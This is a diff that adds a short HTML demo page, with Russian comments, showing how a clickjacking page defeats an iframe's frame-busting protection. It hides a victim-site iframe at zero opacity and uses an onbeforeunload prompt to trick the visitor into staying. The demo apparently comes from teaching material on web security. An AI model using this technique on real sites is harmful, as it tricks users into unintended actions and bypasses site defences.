@@ -1,0 +1,44 @@
+<!doctype html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+
+  <style>
+    iframe {
+      /* iframe с сайта-жертвы */
+      
+      width: 400px;
+      height: 100px;
+      position: absolute;
+      top: 0;
+      left: -20px;
+      opacity: 0;
+      z-index: 1;
+    }
+  </style>
+
+  <script>
+    function attack() {
+
+      window.onbeforeunload = function() {
+        window.onbeforeunload = null;
+        return "Хотите уйти с этой страницы, не узнав все её тайны (хе-хе)?";
+      };
+
+      document.body.insertAdjacentHTML('beforeend', '<iframe src="iframe.html">');
+    }
+  </script>
+</head>
+
+<body>
+
+  <p>При нажатии на кнопку посетитель получит "странный" вопрос о том, не хочет ли уйти со страницы.</p>
+
+  <p>Наверно, он ответит "хочу остаться" и защита ифрейма будет провалена.</p>
+
+  <button onclick="attack()">Подключить "защищённый" iframe</button>
+
+</body>
+
+</html>
